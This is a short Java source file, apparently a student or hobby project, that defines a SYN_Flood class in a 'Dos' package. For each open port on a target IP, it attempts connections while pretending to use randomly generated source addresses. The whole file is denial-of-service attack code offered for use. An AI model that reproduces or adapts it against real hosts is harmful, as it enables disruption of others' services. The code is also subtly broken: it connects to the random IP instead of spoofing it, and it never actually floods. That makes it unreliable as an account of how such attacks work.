package Dos;


import java.io.IOException;
import java.net.*;

/**
 * Created by kenzi on 11/4/16.
 */
public class SYN_Flood extends PortScan {


    public static void attack(String ip) throws IOException {

        InetAddress targetIP = InetAddress.getByName(ip); // Converting input string to ip value

            for (int i = 0; i < openPorts.size(); i++) // For all the target's open ports

                try {

                    int port = openPorts.get(i);

                    InetAddress randomIp = IpAddress.getRandomIpInet(); // Get randomly generated IP address

                    Socket mySocket = new Socket(randomIp, 0);

                    SocketAddress targetSocket = new InetSocketAddress(targetIP, port); // Target's socket address

                    mySocket.connect(targetSocket, port);

                    String message = randomIp + " is sending SYN to " + openPorts.get(i);
                    System.out.println(message);


                } catch (IOException e) {
                    System.out.println("not working");
                }

        }

    }